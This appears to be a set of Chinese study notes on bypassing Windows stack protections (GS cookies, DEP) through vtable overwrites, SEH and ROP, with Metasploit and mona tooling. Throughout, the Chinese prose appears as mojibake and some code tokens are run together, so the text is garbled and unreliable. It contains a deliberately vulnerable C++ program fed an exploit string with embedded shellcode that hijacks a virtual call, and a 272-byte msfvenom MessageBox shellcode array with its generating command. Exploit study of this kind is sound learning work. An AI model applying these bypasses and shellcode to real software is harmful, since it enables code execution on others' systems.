GS å’Œ  DEP éƒ½æ˜¯ç”¨æ¥å¯¹æŠ—æ ˆæº¢å‡ºçš„

### GSï¼ˆå®‰å…¨æ£€æŸ¥ï¼‰

#### 1.GS å®‰å…¨ç¼–è¯‘é€‰é¡¹çš„ä¿æŠ¤åŸç†

-   é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºæ—¶è¦†ç›–å‡½æ•°è¿”å›åœ°å€è¿™ä¸€ç‰¹å¾ï¼Œå¾®è½¯åœ¨ç¼–è¯‘ç¨‹åºæ—¶ä½¿ç”¨äº†ä¸€ä¸ªå¾ˆé…·çš„å®‰å…¨ç¼–è¯‘é€‰é¡¹â€”â€”GSï¼Œåœ¨ Visual Studio 2003 (VS 7.0)åŠä»¥åç‰ˆæœ¬çš„ Visual Studio ä¸­é»˜è®¤å¯ç”¨GSã€‚
-   è®¾ç½®è·¯å¾„ï¼šé¡¹ç›®å±æ€§ â†’ C/C++â†’ ä»£ç ç”Ÿæˆ â†’ å®‰å…¨æ£€æŸ¥ã€‚

![img](./notesimg/1638345342257-43058e8c-dbdf-4b9c-88d7-264e85bee0ec.png)

-   GS ç¼–è¯‘é€‰é¡¹ä¸ºæ¯ä¸ªå‡½æ•°è°ƒç”¨å¢åŠ äº†ä¸€äº›é¢å¤–çš„æ•°æ®å’Œæ“ä½œï¼Œç”¨ä»¥æ£€æµ‹æ ˆä¸­çš„æº¢å‡ºã€‚ 
-   åœ¨æ‰€æœ‰å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œå‘æ ˆå¸§å†…å‹å…¥ä¸€ä¸ªé¢å¤–çš„éšæœº DWORDï¼Œè¿™ä¸ªéšæœºæ•°è¢«ç§°åšâ€œcanaryâ€ï¼ŒIDA åæ±‡ç¼–ä¼šå°†è¿™ä¸ªéšæœºæ•°æ ‡æ³¨ä¸ºâ€œSecurity Cookieâ€ã€‚(è¯¥å€¼ç”±ç³»ç»Ÿæ—¶é—´   çº¿ç¨‹ID   è¿›ç¨‹ID   æ—¶é’Ÿå‘¨æœŸ é€šè¿‡ä¸€ç³»åˆ—è¿ç®—å¾—åˆ°  ,åœ¨è·Ÿebp ä½œå¼‚æˆ–è¿ç®— ç›¸å½“äºéšæœºæ•° )
-   Security Cookie ä½äº EBP ä¹‹å‰ï¼Œç³»ç»Ÿè¿˜å°†åœ¨.dataçš„å†…å­˜åŒºåŸŸä¸­å­˜æ”¾ä¸€ä¸ª Security Cookieçš„å‰¯æœ¬ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚268 
-   å½“æ ˆä¸­å‘ç”Ÿæº¢å‡ºæ—¶ï¼ŒSecurity Cookie å°†è¢«é¦–å…ˆæ·¹æ²¡ï¼Œä¹‹åæ‰æ˜¯ EBP å’Œè¿”å›åœ°å€ã€‚ 
-   åœ¨å‡½æ•°è¿”å›ä¹‹å‰ï¼Œç³»ç»Ÿå°†æ‰§è¡Œä¸€ä¸ªé¢å¤–çš„å®‰å…¨éªŒè¯æ“ä½œï¼Œè¢«ç§°åš Security checkã€‚ 
-   åœ¨ Security Check çš„è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå°†æ¯”è¾ƒæ ˆå¸§ä¸­åŸå…ˆå­˜æ”¾çš„ Security Co okie å’Œ.data ä¸­å‰¯æœ¬çš„å€¼ï¼Œå¦‚æœä¸¤è€…ä¸å»åˆï¼Œè¯´æ˜æ ˆå¸§ä¸­çš„ Security Cookie å·²è¢«ç ´åï¼Œå³æ ˆä¸­å‘ç”Ÿäº†æº¢å‡ºã€‚

![img](./notesimg/1638346214921-ffb60263-2476-4daa-8129-caca5431ebbf.png)

-   å½“æ£€æµ‹åˆ°æ ˆä¸­å‘ç”Ÿæº¢å‡ºæ—¶ï¼Œç³»ç»Ÿå°†è¿›å…¥å¼‚å¸¸å¤„ç†æµç¨‹ï¼Œå‡½æ•°ä¸ä¼šè¢«æ­£å¸¸è¿”å›ï¼Œret æŒ‡ä»¤ä¹Ÿä¸ä¼šè¢«æ‰§è¡Œï¼Œå¦‚å›¾æ‰€ç¤ºã€‚

![img](./notesimg/1638346247064-4c23cd47-4452-45fc-8cee-4e76f185d0a3.png)

-   ä½†æ˜¯é¢å¤–çš„æ•°æ®å’Œæ“ä½œå¸¦æ¥çš„ç›´æ¥åæœå°±æ˜¯ç³»ç»Ÿæ€§èƒ½çš„ä¸‹é™ï¼Œä¸ºäº†å°†å¯¹æ€§èƒ½çš„å½±å“é™åˆ°æœ€å°ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘ç¨‹åºçš„æ—¶å€™å¹¶ä¸æ˜¯å¯¹æ‰€æœ‰çš„å‡½æ•°éƒ½åº”ç”¨ GSï¼Œä»¥ä¸‹æƒ…å†µä¸ä¼šåº”ç”¨ GSã€‚ 

-   -   ï¼ˆ1ï¼‰å‡½æ•°ä¸åŒ…å«ç¼“å†²åŒºã€‚ 
    -   ï¼ˆ2ï¼‰å‡½æ•°è¢«å®šä¹‰ä¸ºå…·æœ‰å˜é‡å‚æ•°åˆ—è¡¨ã€‚ 
    -   ï¼ˆ3ï¼‰å‡½æ•°ä½¿ç”¨æ— ä¿æŠ¤çš„å…³é”®å­—æ ‡è®°ã€‚ 
    -   ï¼ˆ4ï¼‰å‡½æ•°åœ¨ç¬¬ä¸€ä¸ªè¯­å¥ä¸­åŒ…å«å†…åµŒæ±‡ç¼–ä»£ç ã€‚ 
    -   ï¼ˆ5ï¼‰ç¼“å†²åŒºä¸æ˜¯ 8 å­—èŠ‚ç±»å‹ä¸”å¤§å°ä¸å¤§äº 4 ä¸ªå­—èŠ‚ã€‚

-   æœ‰ä¾‹å¤–å°±æœ‰åˆ©ç”¨è¿™äº›ä¾‹å¤–çªç ´ GS çš„æƒ…å†µã€‚å½“ç„¶å¾®è½¯çš„å·¥ç¨‹å¸ˆä¹Ÿå‘ç°äº†è¿™ä¸ªé—®é¢˜ï¼Œå› æ­¤ä»–ä»¬ä¸ºäº†åœ¨æ€§èƒ½ä¸å®‰å…¨ä¹‹é—´æ‰¾åˆ°ä¸€ä¸ªå¹³è¡¡ç‚¹ï¼Œåœ¨ Visual S tudio 2005 SP1 èµ·å¼•å…¥äº†ä¸€ä¸ªæ–°çš„å®‰å…¨æ ‡è¯†ï¼š#pragma strict_gs_checkã€‚

```c++
#include"stdafx.h" 
#include"string.h" 
#pragma strict_gs_check(on) // ä¸ºä¸‹è¾¹çš„å‡½æ•°å¼ºåˆ¶å¯ç”¨ GS 
intvulfuction(char * str) 
{ 
 chararry[4]; 
 strcpy(arry,str); 
 return 1; 
} 
int_tmain(intargc, _TCHAR* argv[]) 
{ 
 char* str="yeah,i have GS protection"; 
 vulfuction(str); 
 return 0; 
}
```

-   é™¤äº†åœ¨è¿”å›åœ°å€å‰æ·»åŠ  Security Cookie å¤–ï¼Œåœ¨ Visual Studio 2005 åŠåç»­ç‰ˆæœ¬è¿˜ä½¿ç”¨äº†å˜é‡é‡æ’æŠ€æœ¯ï¼Œåœ¨ç¼–è¯‘æ—¶æ ¹æ®å±€éƒ¨å˜é‡çš„ç±»å‹å¯¹å˜é‡åœ¨æ ˆå¸§ä¸­çš„ä½ç½®è¿›è¡Œè°ƒæ•´ï¼Œå°†å­—ç¬¦ä¸²å˜é‡ç§»åŠ¨åˆ°æ ˆå¸§çš„é«˜åœ°å€ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢è¯¥å­—ç¬¦ä¸²æº¢å‡ºæ—¶ç ´åå…¶ä»–çš„å±€éƒ¨å˜é‡ã€‚åŒæ—¶è¿˜ä¼šå°†æŒ‡é’ˆå‚æ•°å’Œå­—ç¬¦ä¸²å‚æ•°å¤åˆ¶åˆ°å†…å­˜ä¸­ä½åœ°å€ï¼Œé˜²æ­¢å‡½æ•°å‚æ•°è¢«ç ´åã€‚å¦‚å›¾æ‰€ç¤ºã€‚

![img](./notesimg/1638346629108-a9aa31da-0e5a-4857-9602-500a0c708507.png)

-   ä»å›¾ 10.1.4 ä¸­å¯ä»¥çœ‹å‡ºï¼Œä¸å¯ç”¨ GS æ—¶ï¼Œå¦‚æœå˜é‡ Buff å‘ç”Ÿæº¢å‡ºå˜é‡ iã€è¿”å›åœ°å€ã€å‡½æ•°å‚æ•° arg ç­‰éƒ½ä¼šè¢«è¦†ç›–ï¼Œè€Œå¯ç”¨ GS åï¼Œå˜é‡ Buff è¢«é‡æ–°è°ƒæ•´åˆ°æ ˆå¸§çš„é«˜åœ°å€ï¼Œå› æ­¤å½“ Buff æº¢å‡ºæ—¶ä¸ä¼šå½±å“å˜é‡ i çš„å€¼ï¼Œè™½ç„¶å‡½æ•°å‚æ•° arg è¿˜æ˜¯ä¼šè¢«è¦†ç›–ï¼Œä½†ç”±äºç¨‹åºä¼šåœ¨æ ˆå¸§ä½åœ°å€å¤„ä¿å­˜å‚æ•°çš„å‰¯æœ¬ï¼Œæ‰€ä»¥ Buff çš„æº¢å‡ºä¹Ÿä¸ä¼šå½±å“åˆ°ä¼ é€’è¿›æ¥çš„å‡½æ•°å‚æ•°ã€‚

#### ç»•è¿‡GSä¿æŠ¤æœºåˆ¶

â€‹         å¼€å¯äº†GSå,é€šè¿‡æº¢å‡ºåˆ°è¿”å›åœ°å€,é€šè¿‡ä¿®æ”¹è¿”å›åœ°å€çš„å€¼è·å¾—æ‰§è¡Œæƒé™å·²ç»è¡Œä¸é€šäº†,å› ä¸ºè¿˜æ²¡è¿è¡Œåˆ°retå°±è¢«å®‰å…¨æ£€æŸ¥å¹²æ‰äº†

##### é€šè¿‡çŒœæµ‹cookieså€¼ç»•è¿‡/GSä¿æŠ¤æœºåˆ¶

/GSä¿æŠ¤æœºåˆ¶é‡‡ç”¨äº†å‡ ä¸ªè¾ƒå¼±çš„ç†µæºï¼Œæ”»å‡»è€…å¯ä»¥å¯¹å…¶è¿›è¡Œè®¡ç®—å¹¶ä½¿ç”¨è®¡ç®—ç»“æœæ¥é¢„æµ‹cookieå€¼ï¼Œä½†æ˜¯è¿™ç§çŠ¯æ³•åªé€‚ç”¨äºé’ˆå¯¹æœ¬åœ°ç³»ç»Ÿçš„æ”»å‡»ï¼ˆæ”»å‡»è€…æ‹¥æœ‰è¯¥æœºå™¨çš„è®¿é—®æƒé™ï¼‰ã€‚



##### é€šè¿‡è¦†ç›–è™šå‡½æ•°æŒ‡é’ˆç»•è¿‡

###### â‘´ï¼åŸç†åˆ†æï¼š

ç»è¿‡GSç¼–è¯‘åçš„å‡½æ•°åœ¨æ ˆä¸­çš„åˆ†å¸ƒæƒ…å†µå¦‚å›¾1-3 æ‰€ç¤ºã€‚

![img](./notesimg/1638420950959-d990ee8e-a1d2-4625-b92a-92c035ad96ed.png) 

å›¾ 1-3



![img](./notesimg/1638420950975-c56d040f-4337-4f30-a1d2-9e0eaf649a94.png)



-   ç”±ä¸Šå›¾å¯çŸ¥ï¼Œå‡½æ•°ä¸­çš„bufå˜é‡å‘ç”Ÿæº¢å‡ºçš„æ—¶å€™æœ‰å¯èƒ½å½±å“è™šè¡¨æŒ‡é’ˆï¼Œå¦‚æœå¯ä»¥æ§åˆ¶è™šè¡¨æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘æˆ‘ä»¬shellcodeï¼Œå°±å¯ä»¥åœ¨ç¨‹åºè°ƒç”¨æ—¶æ§åˆ¶ç¨‹åºçš„æµç¨‹

```c++
#include "stdafx.h"
#include "string.h"

class GSVirtual {
public :
	void gsv(char * src)
	{
		char buf[200];
		strcpy(buf, src);    //ä¸“é—¨æ„é€ çš„æ¼æ´è¶Šç•Œä¿®æ”¹è™šè¡¨åœ°å€
        //è™šå‡½æ•°,èµ°è™šè¡¨è°ƒç”¨
		bar();               // virtual function call
	}
	virtual void  bar()
	{
	}
};
int main()
{

	GSVirtual test;
	test.gsv(
		"\xeb\x06\x90\x90"	
		"\x6e\xd0\x1c\x77"
        
        
		"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
		"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
		"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
		"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
		"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
		"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
		"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
		"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
		"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
		"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
		"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
        
        
        "\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x04\x21\x40"
		);
	return 0;
}
```

![img](./notesimg/1659450169282-ce52dec2-a723-409c-a152-601033dee3d4.png)

![img](./notesimg/1659449143580-638b9ea9-22cf-4e77-bce8-cb37ec64db0c.png)

##### é€šè¿‡SEHç»•è¿‡

â€‹         å½“æœ‰SEHçš„æ—¶å€™ ,SEHé‡Œé¢æœ‰ä¸€ä¸ªå‡½æ•°å›è°ƒçš„åœ°å€,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å›è°ƒå‡½æ•°çš„åœ°å€,ç„¶åæƒ³åŠæ³•é€ ä¸€ä¸ªå¼‚å¸¸,è¿™æ ·åœ¨ç›´è¡Œé“retä¹‹å‰å°±ä¼šè¿›å¼‚å¸¸,ç„¶åèµ°å›è°ƒ,å› ä¸ºå›è°ƒå‡½æ•°åœ°å€è¢«æˆ‘ä»¬ä¿®æ”¹äº†,è¿™æ ·å°±å¯ä»¥èµ°shellcode,è¿™æ ·æˆ‘ä»¬å°±è·å¾—äº†æ‰§è¡Œä»£ç çš„æœºä¼š

â€‹        å› æ­¤æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªSEH,å¦å¤–å°±æ˜¯è¦æƒ³åŠæ³•è®©ç¨‹åºè§¦å‘å¼‚å¸¸,æ­£å¸¸æƒ…å†µä¸‹,å‡½æ•°è‡ªå·±ä¸ä¼šè§¦å‘å¼‚å¸¸,å› æ­¤éœ€è¦æˆ‘ä»¬è‡ªå·±æ¥å¤„ç†,ç†ç”±æŠŠæŒ‡é’ˆç½®ç©º,è¿™æ ·æŒ‡é’ˆè®¿é—®å†…å­˜å°±ä¼šè§¦å‘å¼‚å¸¸èµ°SEH







### MSFï¼ˆMetasploitï¼‰

å®˜ç½‘:   https://www.metasploit.com/

#### MSFæ¦‚å¿µ

-   Metasploitæ˜¯ä¸€æ¬¾å¼€æºçš„å®‰å…¨æ¼æ´æ£€æµ‹,ç”Ÿæˆshellcodeå·¥å…·ã€‚
-   è½¯ä»¶å·¥ä¸šä¸­é¢å‘å¯¹è±¡ã€å°è£…ç­‰æ¦‚å¿µçš„æå‡ºå¯¹æ¼æ´åˆ©ç”¨ã€æ¼æ´æµ‹è¯•ç­‰é¢†åŸŸä¹Ÿæœ‰ç€æ·±è¿œçš„å½±å“ã€‚ å°±åƒè½¯ä»¶å¼€å‘ä¸­çš„ MFC æ¶æ„ã€.net æ¶æ„ä¸€æ ·ï¼Œå®‰å…¨æŠ€æœ¯é¢†åŸŸçš„å¼€å‘ä¹Ÿæœ‰ç€è‡ªå·±ç‹¬ç‰¹çš„ Frame Workç”¨äºååŠ©exploitçš„è¿…é€Ÿå¼€å‘ã€‚é€šç”¨åŒ–æ¼æ´æµ‹è¯•ã€åˆ©ç”¨å¹³å°â€”â€”MSFï¼ˆMetaSploit Frame workï¼‰å°±æ˜¯å…¶ä¸­æœ€ä¸ºè‘—åçš„ä¸€ä¸ªã€‚MSFå¯¹æ¨¡å—å’Œç±»ä¼˜ç§€çš„å°è£…æœ€å¤§é™åº¦åœ°ä½“ç°äº†é¢å‘å¯¹è±¡ä¸­ä»£ç é‡ç”¨çš„ä¼˜ç‚¹ã€‚

#### MSFåŸç†

-   MetaSploit FrameWork å¯¹æ¼æ´åˆ©ç”¨çš„å‡ ä¸ªç›¸å¯¹ç‹¬ç«‹çš„è¿‡ç¨‹è¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ï¼ŒæŠŠä¸€æ¬¡å…¥ä¾µæ”»å‡»ç®€åŒ–ä¸ºå¯¹è‹¥å¹²ä¸ªæ¨¡å—çš„é€‰æ‹©ä¸ç»„è£…ã€‚æ¼æ´åˆ©ç”¨æŠ€æœ¯ä¸­ä¸€äº›ç›¸å¯¹ç‹¬ç«‹çš„è¿‡ç¨‹ï¼š

1.  1.  **è§¦å‘æ¼æ´ï¼š**ç¼“å†²åŒºæœ‰å¤šå¤§ï¼Œç¬¬å‡ ä¸ªå­—èŠ‚å¯ä»¥æ·¹æ²¡è¿”å›åœ°å€ï¼Œç”¨ä»€ä¹ˆæ ·çš„æ–¹æ³•æ¤å…¥ä»£ç ï¼Ÿ 
    2.  **é€‰å– shellcodeï¼š**æ‰§è¡Œä»€ä¹ˆæ ·çš„ shellcode å†³å®šäº†æ¼æ´åˆ©ç”¨çš„æ€§è´¨ã€‚ä¾‹å¦‚ï¼Œæ˜¯ä½œä¸ºå®‰å…¨æµ‹è¯•è€Œå¼¹å‡ºçš„ä¸€ä¸ªæ¶ˆæ¯æ¡†ï¼Œè¿˜æ˜¯ç”¨äºå…¥ä¾µçš„ç«¯å£ç»‘å®šã€æœ¨é©¬ä¸Šä¼ ç­‰ã€‚ 
    3.  **é‡è¦å‚æ•°çš„è®¾å®šï¼š**ç›®æ ‡ä¸»æœºçš„ IP åœ°å€ã€bindshell ä¸­éœ€è¦ç»‘å®šçš„ç«¯å£å·ã€æ¶ˆæ¯æ¡†æ‰€æ˜¾ç¤ºçš„å†…å®¹ã€è·³è½¬æŒ‡ä»¤çš„åœ°å€ç­‰ç»å¸¸éœ€è¦åœ¨ shellcode ä¸­è¿›è¡Œä¿®æ”¹ã€‚ 
    4.  **é€‰ç”¨ç¼–ç ã€è§£ç ç®—æ³•ï¼š**å®é™…åº”ç”¨ä¸­çš„ shellcode å¾€å¾€éœ€è¦ç»è¿‡ç¼–ç ï¼ˆåŠ å¯†ï¼‰æ‰èƒ½å®‰å…¨åœ°é€å…¥ç‰¹å®šçš„ç¼“å†²åŒºï¼šæ‰§è¡Œæ—¶ï¼Œä½äº shellcode é¡¶éƒ¨çš„è‹¥å¹²æ¡è§£ç æŒ‡ä»¤ä¼šé¦–å…ˆè¿˜åŸå‡ºåŸå§‹çš„ shellcodeï¼Œç„¶åæ‰§è¡Œã€‚

#### kali-linux-2021.3-vmware-amd64.vmwarevm

-   ç›¸è¾ƒäºå¾®è½¯å¹³å°ï¼Œåœ¨kaliè¿è¡ŒMSFæ›´å¿«é€Ÿï¼Œå‘½ä»¤--msfvenomã€‚
-   **-p    windows/messagebox   -f   raw   -b   '\x0a\x0b\x0c\x20'   -o    shellcode**
-    -p    ç”Ÿæˆshellcodeçš„å‡½æ•°
-   -f      ç”Ÿæˆshellcodeçš„æ ¼å¼  (raw  16è¿›åˆ¶å€¼)
-   -b     ç”Ÿæˆçš„  shellcode ä»£ç ä¸­ä¸ä¼šå‡ºç°çš„å­—èŠ‚
-   -o     ç”Ÿæˆçš„ shellcode çš„ æ–‡ä»¶å

![img](./notesimg/1659455357096-d212a728-1581-4cbc-89f2-e2bb96142d19.png)

```
unsigned AnsiChar data[272] = {
	0xD9, 0xEB, 0x9B, 0xD9, 0x74, 0x24, 0xF4, 0x31, 0xD2, 0xB2, 0x77, 0x31, 0xC9, 0x64, 0x8B, 0x71, 
	0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x38, 
	0x4F, 0x18, 0x75, 0xF3, 0x59, 0x01, 0xD1, 0xFF, 0xE1, 0x60, 0x8B, 0x6C, 0x24, 0x24, 0x8B, 0x45, 
	0x3C, 0x8B, 0x54, 0x28, 0x78, 0x01, 0xEA, 0x8B, 0x4A, 0x18, 0x8B, 0x5A, 0x20, 0x01, 0xEB, 0xE3, 
	0x34, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xEE, 0x31, 0xFF, 0x31, 0xC0, 0xFC, 0xAC, 0x84, 0xC0, 0x74, 
	0x07, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xEB, 0xF4, 0x3B, 0x7C, 0x24, 0x28, 0x75, 0xE1, 0x8B, 0x5A, 
	0x24, 0x01, 0xEB, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x5A, 0x1C, 0x01, 0xEB, 0x8B, 0x04, 0x8B, 0x01, 
	0xE8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xB2, 0x08, 0x29, 0xD4, 0x89, 0xE5, 0x89, 0xC2, 0x68, 
	0x8E, 0x4E, 0x0E, 0xEC, 0x52, 0xE8, 0x9F, 0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x04, 0xBB, 0x7E, 0xD8, 
	0xE2, 0x73, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x8E, 0xFF, 0xFF, 0xFF, 0x89, 0x45, 0x08, 0x68, 0x6C, 
	0x6C, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2E, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xDB, 0x88, 
	0x5C, 0x24, 0x0A, 0x89, 0xE6, 0x56, 0xFF, 0x55, 0x04, 0x89, 0xC2, 0x50, 0xBB, 0xA8, 0xA2, 0x4D, 
	0xBC, 0x87, 0x1C, 0x24, 0x52, 0xE8, 0x5F, 0xFF, 0xFF, 0xFF, 0x68, 0x6F, 0x78, 0x58, 0x20, 0x68, 
	0x61, 0x67, 0x65, 0x42, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x31, 0xDB, 0x88, 0x5C, 0x24, 0x0A, 0x89, 
	0xE3, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68, 0x4D, 0x53, 0x46, 0x21, 0x68, 0x72, 0x6F, 0x6D, 0x20, 
	0x68, 0x6F, 0x2C, 0x20, 0x66, 0x68, 0x48, 0x65, 0x6C, 0x6C, 0x31, 0xC9, 0x88, 0x4C, 0x24, 0x10, 
	0x89, 0xE1, 0x31, 0xD2, 0x52, 0x53, 0x51, 0x52, 0xFF, 0xD0, 0x31, 0xC0, 0x50, 0xFF, 0x55, 0x08
};

è¿™ä¸ªä¸èƒ½ç›´æ¥ç”¨,å› ä¸ºéœ€è¦å…¥æ ˆ,ä½†ä»–æ²¡æœ‰æŠ¬æ ˆ,ä¼šå¯¼è‡´æœ€å¼€å§‹çš„æ•°æ®è¢«æ”¹äº†,å› æ­¤éœ€è¦åœ¨å‰é¢ åŠ æŠ¬æ ˆæŒ‡ä»¤
```

![img](./notesimg/1659456056105-4ef852a9-cb14-4abc-ac33-3491e616159b.png)

![img](./notesimg/1659456022390-ac14aafe-9e6a-4821-b087-e44babede748.png)

![img](./notesimg/1659456575231-4001057f-3a95-4e30-aa40-7331eaaeaf19.png)



æ³¨æ„:  msfç”Ÿæˆçš„shllcode éœ€è¦å¡«å……å‰é¢16ä¸ªå­—èŠ‚ï¼Œå› ä¸ºå®ƒæ˜¯åˆ©ç”¨æµ®ç‚¹é‡å®šä½è¿›è¡Œè‡ªè§£ç ã€‚æ‰€ä»¥ï¼Œä¼šä¿®æ”¹å€¼ï¼Œéœ€è¦ç•™ç©ºç»™ä»–å¡«ã€‚

### KALI

é›†æˆäº†å¾ˆå¤šé€†å‘,å®‰å…¨ç›¸å…³çš„å·¥å…·,è€Œä¸”æœ‰å…¨å¥—çš„å®‰å“é€†å‘å·¥å…·

https://www.kali.org/

![img](./notesimg/1659459483414-b2ba9133-3455-41bc-a708-f2295cb54a6c.png)

### 



### DEP(data execution protection)

#### æ¦‚å¿µ

-   åœ¨æ²¡æœ‰æ‰§è¡Œæƒé™çš„å†…å­˜ä¸Šæ‰§è¡Œä»£ç ï¼Œä¼šæŠ›å¼‚å¸¸
-   åœ¨CFFä¸­çš„æ ‡å¿— Image NX æ ‡å¿—
-   ![img](./notesimg/1638450553174-de9b0cee-becf-4fa0-850c-a51ff66f3627.png)

#### ç§ç±»

#### ç¡¬ä»¶DEPï¼Œcpuæ”¯æŒçš„

-   é€‰é¡¹å¼€å…³ï¼šæˆ‘çš„ç”µè„‘-> å±æ€§-> é«˜çº§ ->æ•°æ®æ‰§è¡Œä¿æŠ¤ã€‚
-   ![img](./notesimg/1638450189297-fae01b23-c071-4ab2-8f2d-1bf56b00ff0b.png)

#### è½¯ä»¶DEPï¼ŒVSé“¾æ¥é€‰é¡¹

-   é€‰é¡¹å¼€å…³ï¼švsé¡¹ç›® -> å±æ€§ -> é“¾æ¥å™¨ -> é«˜çº§ -> æ•°æ®æ‰§è¡Œä¿æŠ¤(DEP)
-   ![img](./notesimg/1659460290603-bb1456c9-cd5d-4f6d-b568-e568a67f3c36.png)



#### å¯¹æŠ—æ–¹æ³•æ€è·¯ï¼š

-   ä¿®æ”¹æ ˆå†…å­˜å±æ€§ã€‚
-   å…³é—­è½¯ä»¶DEPï¼Œé€šè¿‡APIã€‚ï¼ˆSetinfomationprocessï¼‰
-   ç”³è¯·æ–°çš„å†…å­˜ï¼Œè¿™å—æ–°å†…å­˜å…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚

æ‚–è®ºï¼šç”±äºä¸ç®¡ä»¥ä¸Šé‚£ä¸ªæ€è·¯ï¼Œéƒ½éœ€è¦æ‰§è¡Œä¸€æ®µä»£ç æ‰èƒ½å®ç°ï¼Œä½†æ˜¯å†…å­˜æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œä¸ç°å®ç›¸äº’çŸ›ç›¾ã€‚ç”±æ­¤ï¼Œæœ‰äº†ä»¥ä¸‹çš„æ–¹æ³•ã€‚

### ROP (return oriented programming)

#### ROPæ¦‚å¿µ

-   é¢å‘returnç¼–ç¨‹
-   å°†è°ƒç”¨å‡½æ•°éœ€è¦çš„å‚æ•°ç­‰ä¸€ä¸€é€šè¿‡ç¨‹åºä¸­ç°æœ‰ä»£ç åœ°å€ç»™æ„é€ å‡ºæ¥ï¼Œä¸”è¿™äº›åœ°æ–¹éƒ½å¿…é¡»è¦æœ‰æ‰§è¡Œæƒé™ã€‚



##### ROPåŸç†

-   æ„é€ æ‰§è¡Œå„ä¸ªå‚æ•°çš„å€¼ï¼Œå°†å‚æ•°éƒ½èµ‹å€¼åˆ°å„ä¸ªå¯„å­˜å™¨ï¼Œæœ€å¥½pushadå¯„å­˜å™¨ï¼Œç›¸å½“äºä¼ å‚ã€‚

```c++

virtualproctectï¼ˆaddr, len, page_rwxï¼‰

label1:
push page_rwx
ret

label2:
push len
ret

label3:
push addr
ret 

label4:
push virtualproctect
ret

æ ˆç»“æ„å¦‚ä¸‹ï¼š
label1: <- Eip
label2:
label3:
label4:

æ ˆä¸Šä¸æ”¾æŒ‡ä»¤,è€Œæ˜¯æ”¾ä»£ç æ®µåœ°å€  é€šè¿‡ä¸æ–­çš„è¿”å›æ‰§è¡Œä»–åŸæœ¬çš„æŒ‡ä»¤,è¾¾åˆ°èƒ½å¤Ÿé€šè¿‡  
virtualproctectå»ä¿®æ”¹ä»–çš„å†…å­˜å±æ€§,è¿™æ ·å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„shellcode
```

ç”±äºæ„é€ ROTæ‰‹åŠ¨æ„é€ çš„å›°éš¾ï¼Œæ‰€ä»¥æœ‰çˆ±å¥½è€…å¼€å‘äº†å·¥å…·æ¥è¿›è¡Œå„ä¸ªå‘½ä»¤çš„æœç´¢ã€‚

### ODæ’ä»¶

[ğŸ“OllyFindAddr.zip](./OllyFindAddr.zip)

![img](./notesimg/1659462654722-9aba3abe-2913-46c9-9275-adcd2b2d8926.png)

![img](./notesimg/1659462717548-eec5660b-1687-4ebb-bc85-0bcc3ab275de.png)

![img](./notesimg/1659462791322-6abe91db-e868-4692-935a-5476fe7f0dd0.png)



### Immunity Debuger è°ƒè¯•å™¨

-   ç®€ä»‹ï¼šImmunity Debggeræ˜¯ä¸€ä¸ªdebugè°ƒè¯•å™¨,äºŒè¿›åˆ¶æ¼æ´çš„è°ƒè¯•å™¨
-   ç‰¹ç‚¹ï¼šæ”¯æŒpythonè„šæœ¬
-   ç”¨é€”ï¼šåˆ©ç”¨monaè„šæœ¬æ„é€ ROPé“¾
-   ä½¿ç”¨ï¼š

-   -   \1. æ“ä½œï¼šå’ŒODå®Œå…¨ä¸€æ ·ï¼Œæ€€ç–‘å°±æ˜¯ODçš„æºç 



##### mona (pythonè„šæœ¬)

[ğŸ“mona-master.zip](./mona-master.zip)

-   å·¥å…·åç§°ï¼šmona.py
-   è¯­è¨€ç§ç±»ï¼špython è„šæœ¬
-   æ”¯æŒçš„è°ƒè¯•å™¨ï¼š`immunity Debugger` ã€`WinDBG`ã€`WinDBG x64`
-   ä½¿ç”¨ï¼šæ”¾pythonæ’ä»¶çš„æ–‡ä»¶

